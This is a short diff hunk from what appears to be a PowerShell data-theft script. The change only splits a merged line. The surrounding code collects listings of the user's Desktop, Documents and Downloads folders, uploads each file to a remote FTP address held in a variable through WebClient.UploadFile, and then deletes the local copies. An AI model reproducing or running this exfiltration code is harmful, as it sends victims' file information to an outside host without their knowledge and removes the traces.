@@ -55,7 +55,8 @@ dir "$env:userprofile\Desktop" -depth 10 >> $desk
 $uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($down))
 $webclient.UploadFile($uri, $down)
 $uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($docu))
-$webclient.UploadFile($uri, $docu)$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($desk))
+$webclient.UploadFile($uri, $docu)
+$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($desk))
 $webclient.UploadFile($uri, $desk)
 
 del $down
